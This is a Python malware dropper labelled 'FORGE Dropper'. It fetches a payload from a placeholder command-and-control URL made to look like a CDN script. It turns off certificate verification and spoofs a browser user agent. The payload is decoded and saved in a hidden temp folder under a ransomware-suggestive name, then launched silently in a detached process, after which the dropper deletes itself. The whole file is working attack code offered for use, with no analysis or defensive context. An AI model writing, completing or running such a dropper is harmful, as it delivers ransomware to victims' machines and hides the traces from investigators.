#!/usr/bin/env python3
"""FORGE Dropper — Downloads and executes payload from staging server."""
import urllib.request, tempfile, subprocess, os, sys, ssl

STAGE_URL = "https://C2_HOST:443/cdn/assets/main.js"
EXEC_NAME = "ransomware_file_encryption_with_rsa_wrap"

def main():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    tmp = tempfile.mkdtemp(prefix=".")
    payload_path = os.path.join(tmp, EXEC_NAME + ".py")

    try:
        req = urllib.request.Request(STAGE_URL, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/javascript",
        })
        with urllib.request.urlopen(req, context=ctx) as resp:
            data = resp.read()

        # Decode if base64-wrapped in JSON
        if data.startswith(b'{"status"'):
            import json, base64
            j = json.loads(data)
            data = base64.urlsafe_b64decode(j.get("data", ""))

        with open(payload_path, "wb") as f:
            f.write(data)

        os.chmod(payload_path, 0o700)
        subprocess.Popen([sys.executable, payload_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         start_new_session=True)
    except Exception:
        pass
    finally:
        # Self-delete dropper
        try:
            os.unlink(__file__)
        except OSError:
            pass

if __name__ == "__main__":
    main()
